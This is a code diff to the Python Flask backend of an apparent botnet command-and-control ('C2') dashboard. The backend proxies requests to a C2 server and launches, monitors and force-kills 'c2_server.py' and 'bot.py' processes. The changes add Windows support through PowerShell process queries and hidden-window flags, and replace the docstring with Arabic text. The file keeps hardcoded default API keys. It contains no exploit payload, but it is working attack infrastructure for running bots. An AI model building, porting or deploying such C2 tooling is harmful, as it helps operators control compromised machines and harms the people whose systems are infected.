@@ -1,11 +1,8 @@
 """
-C2 Dashboard Backend — Linux/Kali compatible
-Runs on 0.0.0.0:8080 — proxies API calls to the C2 server on port 5000.
+C2 Dashboard Backend — يعمل على 0.0.0.0:8080 ويوجّه الطلبات إلى C2 على المنفذ 5000.
 
-Environment variables (all have safe defaults):
-  DASHBOARD_KEY  — key the browser must send as X-Dashboard-Key (default below)
-  C2_API_KEY     — key forwarded to the C2 server
-  C2_SERVER_URL  — C2 server base URL
+يدعم اكتشاف العمليات على Linux (pgrep) وWindows (PowerShell + CIM)، وللسيرفر يوجد احتياط
+بالتحقق من GET /health عندما لا يُكتشف الملفّ من نظام التشغيل (venv أو اسم مختلف لـ python).
 """
 from flask import Flask, request, jsonify, render_template, Response
 from flask_cors import CORS
@@ -13,6 +10,7 @@ from functools import wraps
 import requests
 import subprocess
 import os
+import sys
 
 app = Flask(__name__)
 CORS(app)
@@ -23,7 +21,10 @@ C2_API_KEY    = os.environ.get("C2_API_KEY",    "c2_super_secret_key_2026_123456
 DASHBOARD_KEY = os.environ.get("DASHBOARD_KEY", "dashboard_secret_2026")
 # Python binary used to spawn c2_server / bot sub-processes.
 # start_all.sh exports PYTHON_BIN pointing to venv/bin/python.
-PYTHON_BIN    = os.environ.get("PYTHON_BIN",    "python3")
+PYTHON_BIN = os.environ.get(
+    "PYTHON_BIN",
+    "python" if sys.platform == "win32" else "python3",
+)
 
 # Headers forwarded to the C2 server on every proxied request
 C2_AUTH = {"X-API-Key": C2_API_KEY, "Content-Type": "application/json"}
@@ -71,29 +72,75 @@ def require_auth(f):
 
 
 # ── Process helpers ───────────────────────────────────────────────────────
-def _pgrep(script_name: str) -> bool:
-    """Return True if any process whose cmdline matches script_name is alive."""
+def _subprocess_creation_flags():
+    if sys.platform == "win32" and hasattr(subprocess, "CREATE_NO_WINDOW"):
+        return subprocess.CREATE_NO_WINDOW
+    return 0
+
+
+def _proc_alive_by_os(script_marker: str) -> bool:
+    """
+    هل توجد عملية تشغّل هذا السكربت؟
+    Linux/macOS/WSL: pgrep -f c2_server.py | bot.py
+    Windows: Get-CimInstance Win32_Process (لا يوجد pgrep افتراضياً).
+    """
+    if sys.platform == "win32":
+        try:
+            marker = (script_marker or "").strip().replace("'", "")
+            if not marker:
+                return False
+            ps_cmd = (
+                "(Get-CimInstance Win32_Process | Where-Object { "
+                "$null -ne $_.CommandLine -and "
+                f"$_.CommandLine -like '*{marker}*'"
+                " }).Count"
+            )
+            r = subprocess.run(
+                ["powershell", "-NoProfile", "-Command", ps_cmd],
+                capture_output=True,
+                text=True,
+                timeout=22,
+                creationflags=_subprocess_creation_flags(),
+            )
+            out = (r.stdout or "").strip()
+            return out.isdigit() and int(out) > 0
+        except Exception:
+            return False
     try:
         r = subprocess.run(
-            ["pgrep", "-f", script_name],
+            ["pgrep", "-f", script_marker],
             stdout=subprocess.DEVNULL,
             stderr=subprocess.DEVNULL,
         )
         return r.returncode == 0
     except FileNotFoundError:
-        return False  # pgrep unavailable
+        return False
+
+
+def _c2_http_alive() -> bool:
+    """يعمل حتى لو المسلك مختلفاً عن اسم ملفّ السيرفر في cmdline (مثل الإعداد عن بعد أو اسم مختلف للعملية)."""
+    try:
+        r = requests.get(f"{C2_SERVER_URL}/health", timeout=2)
+        return bool(r.ok)
+    except Exception:
+        return False
 
 
 def _proc_status(name: str) -> str:
     """
-    Check whether a named service is running.
-    1. Check the tracked Popen handle (started by us).
-    2. Fall back to pgrep (catches externally-started processes too).
+    تشغيل عملية معروفة؟
+    1) POpen الذي بدأناه من هذه الدورة من لوحة التحكم.
+    2) مطابقة سطر الأمر بالاسم النسبي للسكربت (Linux أو Windows).
+    3) للسيرفر فقط: استجابة HTTP على /health.
     """
     p = _procs.get(name)
     if p is not None and p.poll() is None:
         return "running"
-    return "running" if _pgrep(_SCRIPT[name]) else "stopped"
+    if _proc_alive_by_os(_SCRIPT[name]):
+        return "running"
+    if name == "server" and _c2_http_alive():
+        return "running"
+    return "stopped"
 
 
 # ── C2 proxy helpers ──────────────────────────────────────────────────────
@@ -163,7 +210,6 @@ def stop_process(name: str):
 
     script_name = _SCRIPT[name]
 
-    # pkill -f kills ALL matching processes, including ones not started by us
     try:
         subprocess.run(
             ["pkill", "-f", script_name],
@@ -171,7 +217,27 @@ def stop_process(name: str):
             stderr=subprocess.DEVNULL,
         )
     except FileNotFoundError:
-        pass  # pkill unavailable — fall through to Popen handle below
+        pass  # Windows: لا pgrep/pkill
+
+    if sys.platform == "win32":
+        try:
+            marker = script_name.replace("'", "")
+            ps_cmd = (
+                "Get-CimInstance Win32_Process | Where-Object { "
+                "$null -ne $_.CommandLine -and "
+                f"$_.CommandLine -like '*{marker}*'"
+                " } | ForEach-Object { "
+                "Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }"
+            )
+            subprocess.run(
+                ["powershell", "-NoProfile", "-Command", ps_cmd],
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+                timeout=30,
+                creationflags=_subprocess_creation_flags(),
+            )
+        except Exception:
+            pass
 
     # Also terminate the tracked Popen handle if still alive
     p = _procs.get(name)
